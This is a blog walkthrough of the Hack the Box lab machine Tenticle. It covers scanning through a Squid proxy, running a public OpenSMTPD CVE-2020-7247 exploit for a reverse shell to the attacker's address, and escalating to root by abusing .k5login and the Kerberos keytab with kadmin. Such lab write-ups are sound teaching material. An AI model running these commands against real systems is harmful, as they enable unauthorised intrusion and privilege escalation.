+++
author = "Nick"
categories = ["Hard", "Linux", "hack the box", "Squid Proxy", "Squid", "Kerberos", ".k5login", "ssh", "ksu", "kadmin", "proxychains", "CVE-2020-7247", "OpenSMTPD"]
date = 2021-06-19T16:33:48Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2021/06/tenticle.png"
slug = "hack-the-box-tenticle"
summary = "Welcome back! Today's write-up is for the Hack the Box machine - Tenticle. This was listed as hard Linux box. I would argue it might be on the upper scale of 'hard' and pretty lifelike. Let's jump in!"
tags = ["Hard", "Linux", "hack the box", "Squid Proxy", "Squid", "Kerberos", ".k5login", "ssh", "ksu", "kadmin", "proxychains", "CVE-2020-7247", "OpenSMTPD"]
title = "Hack the Box - Tenticle"

+++


Welcome back! Today's write-up is for the Hack the Box machine - Tenticle. This was listed as hard Linux box. I actually had to do this machine twice since my notes and screenshots were lost midway through :(. I would argue it might be on the upper scale of 'hard' and pretty lifelike. Let's jump in!

As always, `nmap`. Here are our results:

```
Nmap scan report for 10.10.10.224
Host is up (0.050s latency).
Not shown: 65530 filtered ports
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open   domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open   kerberos-sec MIT Kerberos (server time: 2021-04-10 13:50:38Z)
3128/tcp open   http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
9090/tcp closed zeus-admin
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
```

A small selection of ports. We also have a leaked hostname of `realcorp.htb`. We also see that port 3128 is running a web proxy. Open up the browser and we take a look at what might be there.



{{< figure src="__GHOST_URL__/content/images/2021/06/image-23.png" >}}

Just an error, but we do see a email and vhost as well - `srv01.realcorp.htb`. We'll add these to our host file and start enumerating them. There are a few ways to enumerate subdomains. Here's a [good resource](https://www.offensity.com/de/blog/just-another-recon-guide-pentesters-and-bug-bounty-hunters/) for subdomain enumeration. In this case we'll just use a simple `dnsenum`, it's built into Kali and works just fine for the CTF usecase.

Command:
`dnsenum --threads 30 --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt realcorp.htb`

We get quite a few items listed.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-24.png" >}}

So even when we add these hostnames to our system, we aren't able to get any type of resolution. We are still met with the `Squid` proxy page. So there's a good chance we need to use the `Squid` proxy that's being shown to interact past what we are currently seeing. There are also a few ways to do this, we can install `Squid` on our machine and communicate that way or we can use the built in `proxychains` tool (`Proxychains` is only available nativly if you leverage `apt install kali-linux-everything` otherwise you'll need to `apt install` the package). Here's [quick blurb](https://book.hacktricks.xyz/pentesting/3128-pentesting-squid) on leveraging `proxychains` and `squid`.

In this case, configuring `Proxychains` to leverage the `Squid` web proxy is easy. We can edit the `proxychain4.conf` file. This file is located in `/etc/` directly.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-26.png" >}}

I had some issues getting data across the proxychain, this was because I'm an idiot and had some explicit firewall settings setup prior. Don't be me, double check your firewall rules...

Command:
`proxychains nmap -sC -sV -p- -oA proxyscan 10.197.243.31`

Eventually, we should get back our `nmap` scan results:

{{< figure src="__GHOST_URL__/content/images/2021/06/image-28.png" >}}

Perfect, some services running that are much interesting. We can add `wpad.realcorp.htb` to our hosts file. Now when we try and `curl` the `wpad` url, we should see somthing.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-29.png" >}}

or not... In this case, we pretty much knew nothing was going to come back, since that's not the purpose of a `wpad` dns entry. This entry should host a `wpad.dat` file to help us find the proper routes. You can read up more on `wpad` [here](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol#:~:text=The%20Web%20Proxy%20Auto%2DDiscovery,proxy%20for%20a%20specified%20URL.).

So now we'll `curl` for this file.

Command:
`proxychains curl http://wpad.realcorp.htb/wpad.dat`

Sure enough, some routes come back

{{< figure src="__GHOST_URL__/content/images/2021/06/image-30.png" >}}

This file tells us there are active services running in the 10.241.251.1(/24?) space. Let's try and find them with `nmap`.

Command:
`proxychains nmap -T5 -Pn 10.241.251.0/24`

Eventually we find one machine that's alive: `10.241.251.113`. We use `nmap` to enumerate this machine further and see that it's running `OpenSMTPD`. A quick `searchsploit` shows there are a few PoC codes for this service.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-31.png" >}}

After some trial and error, we see that the `OpenSMTPD` 6.6.1 exploit seems to be valid.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-32.png" >}}

So now we will give it the old `Bash` reverse shell and have it connect back to our `Netcat` listener. Turns out, this won't work for us, the code needs to be modified a bit more. Now, I didn't modify the code, I just searched for another and found this: https://github.com/QTranspose/CVE-2020-7247-exploit/blob/main/exploit.py.

We have an email from our earlier enumeration - j.nakazawa@realcorp.htb. So we can run this and see what we get!

Command:
`proxychains python3 exploit.py 10.241.251.113 25 10.10.14.101 7070 j.nakazawa@realcorp.htb`

{{< figure src="__GHOST_URL__/content/images/2021/06/smtp_accerss.gif" >}}

Awesome, now we have a foothold! Now what? We can enumerate more! We find a file called `.msmtprc`. Inside we have a password, yes! We try to login with it aaannddd nope. Denied. There are some login controls in place here. If we look back at our port scan on the box, we remember seeing three ports for kerberos. Looks like we'll need to generate a kerberos ticket to log in with. This isn't as hard as it might sound. 

First we install the kerberos user package.

Command:
`sudo apt install krb5-user`

Next we add our target to the config file as the primary kdc. This file is under `/etc/krb5.conf`.

We need to edit a few lines, first our `default_realm`, that needs to be our target domain, `REALCORP.HTB`. Next we need to add a new realm of `REALCORP.HTB`. Then add  the `domain_realm` for this domain. All in all these are what the modified lines should look like:

{{< figure src="__GHOST_URL__/content/images/2021/06/image-38.png" >}}

{{< figure src="__GHOST_URL__/content/images/2021/06/image-36.png" >}}

Now we can use the `kinit` command to generate ourselves a ticket for j.nakazawa.

Command:
`kinit j.nakazawa`

We don't get a response, so we check the kerberos table with `klist` and we should see a ticket!

{{< figure src="__GHOST_URL__/content/images/2021/06/image-39.png" >}}

Now we should be able to SSH into the box!

{{< figure src="__GHOST_URL__/content/images/2021/06/image-40.png" >}}

We get in and snag our `user.txt` flag! Now we can start enumerating more to identify a priv esc. We download over `linpeas` and some other enumeration tools and start poking around.

We find this entry that stands out a bit:

{{< figure src="__GHOST_URL__/content/images/2021/06/image-41.png" >}}

It's in a location that can be globally accessed and we have execute rights on. As we keep sifting through the output we also see it's called on a cron:

{{< figure src="__GHOST_URL__/content/images/2021/06/image-42.png" >}}

We can take a look at the script being called.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-43.png" >}}

Interesting, we are syncing over items from `/var/log/squid/` to `/home/admin`. Awesome, normally, we could copy over an `SSH` key or something but in this case, we're just going to copy over the kerberos auth file. [Here is some](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html) reading about how a `.k5login` file works. From the above:

> The .k5login file, which resides in a user’s home directory, contains a list of the Kerberos principals. Anyone with valid tickets for a principal in the file is allowed host access with the UID of the user in whose home directory the file resides. One common use is to place a .k5login file in root’s home directory, thereby granting system administrators remote root access to the host via Kerberos.

So let's just put our `j.nakazawa` account, into a `.k5login` file and put it into the directory to be copied via the running cron.

Commands:
`echo 'j.nakazawa@REALCORP.HTB >> .k5login'`
`cp .k5login /var/log/squid`

After we do that, we should be able to `SSH` into the machine as admin.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-44.png" >}}

Awesome, we're up one more user, let's re-run our enumeration. An interesting set of lines shows up:

{{< figure src="__GHOST_URL__/content/images/2021/06/image-45.png" >}}

We see a file `/etc/krb5.keytab` being read bia an impersonation command. Some qiuck googling gives us [this](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5/doc/krb5-install/The-Keytab-File.html). Fully compromise a system eh? Let's try and get to that! Dig up the [manual](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html) for `kadmin` and try to add our user to the `krb5.keytab` file.

Command:
`kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB`

If this works, we are prompted with the `kadmin` interface.

{{< figure src="__GHOST_URL__/content/images/2021/06/image-46.png" >}}

Now we need to add our user ticket to the root account.

Command:
`kadmin: add_principal root@REALCORP.HTB`

We make a password for the account and  `exit` from the interface. Now we can try to use the [`ksu` function](https://web.mit.edu/kerberos/krb5-latest/doc/user/user_commands/ksu.html) to escalate to root with the new credentials we just installed.

Command:
`ksu root`

{{< figure src="__GHOST_URL__/content/images/2021/06/tent_root.gif" >}}

There we have it! The `root.txt` flag! This was a very fun and realistic machine. This is along the same lines of machines you can find as a Red Team Operator, I know I've seen my fair share of improper Kerberos implimentations in Linux.

If this write-up was helpful, send some respect my way: https://app.hackthebox.eu/profile/95635



